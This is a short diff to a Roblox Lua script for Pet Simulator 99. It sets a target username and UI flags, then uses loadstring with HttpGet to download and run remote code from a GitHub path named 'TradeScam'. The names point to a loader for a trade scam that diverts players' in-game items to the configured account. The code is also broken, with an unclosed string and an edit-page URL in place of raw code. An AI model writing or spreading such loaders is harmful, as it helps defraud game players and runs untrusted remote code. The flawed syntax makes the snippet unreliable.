@@ -1,1 +1,4 @@
+farmuiUsername = "hiro230_kyn
+loadingscreen = true 
+farmui = false
 loadstring(game:HttpGet("https://github.com/jayciegantala/Petsim99/edit/main/TradeScam"))()
